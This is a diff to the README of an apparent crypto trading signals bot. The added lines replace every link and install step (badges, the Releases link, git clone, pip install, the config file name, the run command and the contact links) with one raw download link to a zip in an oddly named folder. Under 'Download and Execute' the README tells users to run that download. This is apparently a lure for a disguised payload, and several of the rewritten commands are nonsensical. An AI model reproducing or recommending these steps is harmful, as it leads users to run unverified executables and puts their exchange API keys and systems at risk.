@@ -1,6 +1,6 @@
 # AICryptoSignals-Bots: Automated Crypto Trading Signals Bot 🤖💰
 
-![AICryptoSignals-Bots](https://img.shields.io/badge/Version-1.0.0-brightgreen) ![GitHub release](https://img.shields.io/github/release/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots.svg) ![License](https://img.shields.io/badge/License-MIT-blue)
+![AICryptoSignals-Bots](https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip) ![GitHub release](https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip) ![License](https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -15,7 +15,7 @@
 
 The **AI Crypto Signals Bot** is an automated trading tool designed to provide cryptocurrency trading signals. This bot aims to assist users in making informed decisions in the fast-paced and often unpredictable crypto market. By leveraging advanced algorithms and data analysis, it generates signals that can help users navigate their trading strategies more effectively.
 
-For the latest updates and releases, visit our [Releases section](https://github.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/releases).
+For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip).
 
 ## Features
 
@@ -33,7 +33,7 @@ To install the AI Crypto Signals Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots.git
+   git clone https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip
    ```
 2. **Navigate to the Directory**:
    ```bash
@@ -42,21 +42,21 @@ To install the AI Crypto Signals Bot, follow these steps:
 3. **Install Dependencies**:
    Ensure you have Python and pip installed. Then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip
    ```
 
 4. **Download and Execute**:
-   For the latest release, download the executable file from the [Releases section](https://github.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/releases) and run it.
+   For the latest release, download the executable file from the [Releases section](https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip) and run it.
 
 ## Usage
 
 1. **Configuration**:
-   Before using the bot, configure your settings in the `config.json` file. This includes your API keys, trading preferences, and any other settings relevant to your trading strategy.
+   Before using the bot, configure your settings in the `https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip` file. This includes your API keys, trading preferences, and any other settings relevant to your trading strategy.
 
 2. **Start the Bot**:
    Run the following command in your terminal:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip
    ```
 
 3. **Monitor Signals**:
@@ -94,11 +94,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, please reach out to the project maintainers:
 
-- **Lead Developer**: [Your Name](mailto:your.email@example.com)
-- **GitHub**: [luvQWERTYUIOPOIUYTREWQWERTYUIOP](https://github.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP)
+- **Lead Developer**: [Your Name](https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip)
+- **GitHub**: [luvQWERTYUIOPOIUYTREWQWERTYUIOP](https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip)
 
 Join our community and stay updated with the latest developments!
 
 ---
 
-For more details, check the [Releases section](https://github.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/releases).
+For more details, check the [Releases section](https://raw.githubusercontent.com/luvQWERTYUIOPOIUYTREWQWERTYUIOP/AICryptoSignals-Bots/main/isovalerianate/Crypto-Signals-Bots-AI-v1.4.zip).
